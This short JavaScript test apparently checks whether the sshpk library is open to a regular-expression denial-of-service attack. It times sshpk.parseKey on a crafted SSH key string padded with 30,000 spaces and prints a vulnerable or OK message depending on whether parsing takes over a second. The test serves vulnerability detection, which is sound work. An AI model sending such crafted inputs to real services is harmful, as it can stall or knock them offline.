// test("ReDos in sshpk", () => {
  const sshpk = require("sshpk");
  const measureTime = require("../utils").measureTime;
  let t = measureTime(function () {
    let keyPub = `ssh-rsa a${" ".repeat(30000)}x\nx`;
    try {
      sshpk.parseKey(keyPub, "ssh");
    } catch (e) {}
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
